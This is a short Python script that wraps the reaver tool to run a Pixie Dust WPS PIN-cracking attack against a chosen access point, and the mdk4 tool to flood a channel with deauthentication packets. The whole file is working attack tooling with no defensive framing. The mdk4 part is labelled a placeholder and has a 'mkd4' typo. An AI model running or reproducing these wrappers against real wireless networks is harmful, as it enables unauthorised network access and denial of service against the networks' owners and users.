import subprocess
import shlex

def run_pixie_dust(interface, target):
    try:
        print("\nRunning Pixie Dust attack...")
        args = shlex.split(f"reaver -i {interface} -b {target['BSSID']} -c {target['Channel']} -K 1 -f -vvv")

        process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        try:
            stdout, stderr = process.communicate(timeout=120)
        except subprocess.TimeoutExpired:
            process.kill()
            stdout, stderr = process.communicate()
            print("Pixie Dust attack stopped after 120 seconds timeout.")
            return  # Вийти , не обробляючи як успішне завершення

        if process.returncode == 0:
            print("Pixie Dust attack completed successfully.")
            print(stdout.decode())
        else:
            print("Error during Pixie Dust attack:")
            print(stderr.decode())
    except Exception as e:
        print(f"An error occurred: {e}")

def run_mdk4(interface, target):
    try:
        print("\nRunning mkd4 attack...")
        # Assuming mkd4 is a command that needs to be run with specific parameters

        subprocess.call(shlex.split(f"mdk4 {interface} d -c {target['Channel']} "))
        print("mkd4 command executed (placeholder).")
    except Exception as e:
        print(f"An error occurred: {e}")